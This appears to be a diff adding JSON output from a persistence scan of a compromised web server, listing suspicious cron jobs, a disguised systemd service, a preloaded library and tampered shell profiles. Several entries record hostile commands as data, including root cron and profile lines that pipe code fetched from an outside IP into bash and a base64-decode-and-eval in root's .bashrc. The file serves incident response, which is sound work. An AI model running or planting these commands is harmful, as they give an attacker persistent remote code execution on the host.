@@ -1,0 +1,23 @@
+{
+  "collected_at": "2026-02-21T03:15:00Z",
+  "hostname": "web-prod-01",
+  "check": "persistence",
+  "cron_jobs": [
+    {"source":"user_crontab","user":"www-data","entry":"*/5 * * * * /tmp/.cache/update.sh"},
+    {"source":"/etc/crontab","entry":"0 */3 * * * root curl -s http://91.215.85.17/payload | bash"},
+    {"source":"/etc/cron.d","file":"/etc/cron.d/certbot","entry":"certbot"},
+    {"source":"/etc/cron.d","file":"/etc/cron.d/.sysupdate","entry":".sysupdate"}
+  ],
+  "systemd_suspicious": [
+    {"service":"syslogd-helper.service","path":"/etc/systemd/system/syslogd-helper.service","description":"System Logging Helper Daemon"}
+  ],
+  "rc_local": "#!/bin/sh\n/opt/.hidden/init.sh &\nexit 0",
+  "ld_preload": [
+    {"library": "/usr/local/lib/libaudit_helper.so", "exists": true}
+  ],
+  "shell_profiles": [
+    {"file": "/etc/profile.d/sysenv.sh", "suspicious": true, "snippet": "curl -s http://91.215.85.17/update | bash"},
+    {"file": "/root/.bashrc", "suspicious": true, "snippet": "eval $(base64 -d /tmp/.enc)"}
+  ],
+  "errors": []
+}
